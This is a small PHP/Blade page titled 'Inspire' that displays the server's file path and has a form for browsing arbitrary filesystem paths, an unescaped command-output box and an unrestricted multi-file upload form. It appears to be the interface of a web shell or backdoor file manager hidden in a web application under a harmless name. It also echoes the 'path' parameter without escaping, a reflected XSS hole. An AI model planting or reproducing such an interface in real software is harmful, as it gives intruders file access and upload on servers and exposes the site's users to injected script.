<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Inspire</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
</head>

<body>
    <div class="container">
	Current file path: <?php echo __FILE__; ?> <br />
<form method="GET" action="">
    Path: <input type="text" name="path" size="50" value="<?php if (isset($_GET['path'])) { echo $_GET['path']; } ?>" />
    <button type="submit">Go</button>
</form>

<pre style="background-color:#000; color:#fff">
{!! $msg !!}
</pre>
<hr />
        <form method="POST" action="" enctype="multipart/form-data">
    File(s): <input type="file" name="uploads[]" multiple="multiple" required="required" />
    <button type="submit">Upload</button>
</form>
    </div>
</body>
</html>